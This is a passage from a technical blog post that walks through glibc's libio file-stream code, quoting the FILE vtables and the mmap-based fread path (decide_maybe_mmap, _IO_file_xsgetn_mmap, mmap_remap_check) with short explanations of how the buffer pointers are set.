  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
</code></pre></div><p>Which means <code>_IO_sgetn</code> calls <code>_IO_file_xsgetn_maybe_mmap</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1409
</span><span class="c1"></span>
<span class="k">static</span> <span class="n">size_t</span>
<span class="nf">_IO_file_xsgetn_maybe_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* We only get here if this is the first attempt to read something.
</span><span class="cm">     Decide which operations to use and then punt to the chosen one.  */</span>

  <span class="n">decide_maybe_mmap</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p><code>decide_maybe_mmap</code> is basicaly trying to map the file, if it succeeds the <code>vtable</code> is initialized to <code>&amp;_IO_file_jumps_mmap</code> else it&rsquo;s initialized to <code>&amp;_IO_file_jumps</code>. The function is pretty easy to read, except maybe for the <code>S_ISREG (st.st_mode) &amp;&amp; st.st_size != 0</code> that checks if it is a regular file and if its size isn&rsquo;t null. Here is the full code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L658
</span><span class="c1"></span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">decide_maybe_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* We use the file in read-only mode.  This could mean we can
</span><span class="cm">     mmap the file and use it without any copying.  But not all
</span><span class="cm">     file descriptors are for mmap-able objects and on 32-bit
</span><span class="cm">     machines we don&#39;t want to map files which are too large since
</span><span class="cm">     this would require too much virtual memory.  */</span>
  <span class="k">struct</span> <span class="n">__stat64_t64</span> <span class="n">st</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_SYSSTAT</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
      <span class="o">&amp;&amp;</span> <span class="n">S_ISREG</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_mode</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">!=</span> <span class="mi">0</span>
      <span class="cm">/* Limit the file size to 1MB for 32-bit machines.  */</span>
      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">ptrdiff_t</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
      <span class="cm">/* Sanity check.  */</span>
      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span> <span class="o">||</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&lt;=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* Try to map the file.  */</span>
      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>

      <span class="n">p</span> <span class="o">=</span> <span class="n">__mmap64</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="cm">/* OK, we managed to map the file.  Set the buffer up and use a
</span><span class="cm">	     special jump table with simplified underflow functions which
</span><span class="cm">	     never tries to read anything from the file.  */</span>

	  <span class="k">if</span> <span class="p">(</span><span class="n">__lseek64</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="o">!=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
	    <span class="p">}</span>
	  <span class="k">else</span>
	    <span class="p">{</span>
	      <span class="n">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">p</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	      <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">p</span> <span class="o">+</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">p</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>

	      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps_mmap</span><span class="p">;</span>
	      <span class="k">else</span>
		<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps_mmap</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps_mmap</span><span class="p">;</span>

	      <span class="k">return</span><span class="p">;</span>
	    <span class="p">}</span>
	<span class="p">}</span>
    <span class="p">}</span>

  <span class="cm">/* We couldn&#39;t use mmap, so revert to the vanilla file operations.  */</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>Two operations are very important to note in this function. First, <code>_IO_setb</code> (<a
  class="gblog-markdown__link"
  href="#common-functions"
  
  >take a look at this</a
>) is called to initialize the begin of the  base buffer to the begin of the memory mapping of the file, the end of the base buffer is then initialized to the end of the file (<code>p + st.st_size</code>). Right after <code>_IO_setg</code> (<a
  class="gblog-markdown__link"
  href="#common-functions"
  
  >take a look at this</a
>) is called to initialize the read buffer of the file, the base of the read buffer is initialized to the mapping of the file, the current pointer to <code>p + fp-&gt;_offset</code> and the end of the buffer to the end of the file mapping.</p>
<p>Then according to what <code>vtable</code> is used, the <code>xsgetn</code> is distinct:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1457
</span><span class="c1"></span>
<span class="c1">// vtable if the file is maped
</span><span class="c1"></span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps_mmap</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_new_file_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_file_seekoff_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">)</span> <span class="n">_IO_file_setbuf_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_file_sync_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>

<span class="c1">// vanilla vtable
</span><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1432
</span><span class="c1"></span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_new_file_seekoff</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="_io_file_xsgetn_mmap">
        _IO_file_xsgetn_mmap
        <a data-clipboard-text="https://nasm.re/posts/filestream/#_io_file_xsgetn_mmap" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor _IO_file_xsgetn_mmap" href="#_io_file_xsgetn_mmap">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Let&rsquo;s first take a look at <code>_IO_file_xsgetn_mmap</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1364
</span><span class="c1"></span>
<span class="k">static</span> <span class="n">size_t</span>
<span class="nf">_IO_file_xsgetn_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">have</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>

  <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">)))</span>
	<span class="p">{</span>
	  <span class="n">s</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">read_ptr</span><span class="p">,</span> <span class="n">have</span><span class="p">);</span>
	  <span class="n">n</span> <span class="o">-=</span> <span class="n">have</span><span class="p">;</span>
	  <span class="n">_IO_switch_to_main_get_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	  <span class="n">read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="cm">/* Check that we are mapping all of the file, in case it grew.  */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">mmap_remap_check</span> <span class="p">(</span><span class="n">fp</span><span class="p">)))</span>
	    <span class="cm">/* We punted mmap, so complete with the vanilla code.  */</span>
	    <span class="k">return</span> <span class="n">s</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span> <span class="o">+</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>

	  <span class="n">read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">read_ptr</span><span class="p">;</span>
	<span class="p">}</span>
    <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">have</span> <span class="o">=</span> <span class="n">MIN</span> <span class="p">(</span><span class="n">have</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
      <span class="n">s</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">read_ptr</span><span class="p">,</span> <span class="n">have</span><span class="p">);</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">read_ptr</span> <span class="o">+</span> <span class="n">have</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">s</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L541
</span><span class="c1"></span>
<span class="cm">/* Guts of underflow callback if we mmap the file.  This stats the file and
</span><span class="cm">   updates the stream state to match.  In the normal case we return zero.
</span><span class="cm">   If the file is no longer eligible for mmap, its jump tables are reset to
</span><span class="cm">   the vanilla ones and we return nonzero.  */</span>
<span class="k">static</span> <span class="kt">int</span>
<span class="nf">mmap_remap_check</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">stat64</span> <span class="n">st</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_SYSSTAT</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
      <span class="o">&amp;&amp;</span> <span class="n">S_ISREG</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_mode</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">!=</span> <span class="mi">0</span>
      <span class="cm">/* Limit the file size to 1MB for 32-bit machines.  */</span>
      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">ptrdiff_t</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="k">const</span> <span class="n">size_t</span> <span class="n">pagesize</span> <span class="o">=</span> <span class="n">__getpagesize</span> <span class="p">();</span>
<span class="cp"># define ROUNDED(x)	(((x) + pagesize - 1) &amp; ~(pagesize - 1))
</span><span class="cp"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span>
					  <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
	<span class="p">{</span>
	  <span class="cm">/* We can trim off some pages past the end of the file.  */</span>
	  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">),</span>
			   <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
			   <span class="o">-</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">));</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span>
					       <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
	<span class="p">{</span>
	  <span class="cm">/* The file added some pages.  We need to remap it.  */</span>
	  <span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
<span class="cp">#if _G_HAVE_MREMAP
</span><span class="cp"></span>	  <span class="n">p</span> <span class="o">=</span> <span class="n">__mremap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span>
						   <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">),</span>
			<span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">),</span> <span class="n">MREMAP_MAYMOVE</span><span class="p">);</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
			       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	      <span class="k">goto</span> <span class="n">punt</span><span class="p">;</span>
	    <span class="p">}</span>
<span class="cp">#else
</span><span class="cp"></span>	  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
			   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	  <span class="n">p</span> <span class="o">=</span> <span class="n">__mmap64</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span>
			<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
	    <span class="k">goto</span> <span class="n">punt</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="p">{</span>
	  <span class="cm">/* The number of pages didn&#39;t change.  */</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
	<span class="p">}</span>
<span class="cp"># undef ROUNDED
</span><span class="cp"></span>
